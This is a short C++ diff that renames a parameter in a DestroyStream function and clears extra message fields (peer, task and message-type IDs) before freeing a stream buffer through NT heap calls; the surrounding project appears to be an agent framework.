@@ -55,20 +55,23 @@ namespace Stream {
         return stream;
     }
 
-    VOID DestroyStream (PSTREAM stream) {
+    VOID DestroyStream (PSTREAM Stream) {
         HEXANE
 
-        if (stream) {
-            if (stream->Buffer) {
+        if (Stream) {
+            if (Stream->Buffer) {
 
-                x_memset(stream->Buffer, 0, stream->Length);
-                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, stream->Buffer);
+                x_memset(Stream->Buffer, 0, Stream->Length);
+                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Stream->Buffer);
 
-                stream->Buffer = nullptr;
-                stream->Length = 0;
+                Stream->Buffer  = nullptr;
+                Stream->PeerId  = 0;
+                Stream->TaskId  = 0;
+                Stream->MsgType = 0;
+                Stream->Length  = 0;
             }
 
-            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, stream);
+            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Stream);
         }
     }
 
